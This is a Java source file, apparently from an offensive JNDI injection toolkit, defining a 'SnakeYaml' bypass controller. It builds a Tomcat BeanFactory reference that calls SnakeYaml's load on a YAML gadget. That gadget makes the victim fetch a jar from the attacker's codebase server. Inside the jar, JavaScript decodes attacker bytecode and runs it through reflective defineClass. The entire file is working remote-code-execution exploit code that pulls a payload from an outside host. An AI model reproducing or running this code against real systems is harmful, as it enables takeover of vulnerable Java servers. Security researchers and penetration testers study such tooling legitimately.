package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.utils.MiscUtils;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import com.h2tg.ysogate.exploit.server.WebServer;
import com.h2tg.ysogate.template.ScriptEngineFactoryTemplate;
import com.h2tg.ysogate.utils.JarUtils;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.util.Base64;
import com.h2tg.ysogate.utils.CtClassUtils;

@JNDIController
@JNDIMapping("/SnakeYaml")
public class SnakeYamlController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");

        String factoryClassName = MiscUtils.getRandStr(12);
        String jarName = MiscUtils.getRandStr(12);

        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";

        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"" + JndiConfig.codebase + jarName + ".jar" + "\"]\n" +
                "  ]]\n" +
                "]";

        byte[] jarBytes = null;

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), factoryClassName);
            CtClassUtils.setCtField(clazz, "code", CtField.Initializer.constant(code));

            jarBytes = JarUtils.createWithSPI(factoryClassName, clazz.toBytecode());
        } catch (Exception e) {
            e.printStackTrace();
        }

        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
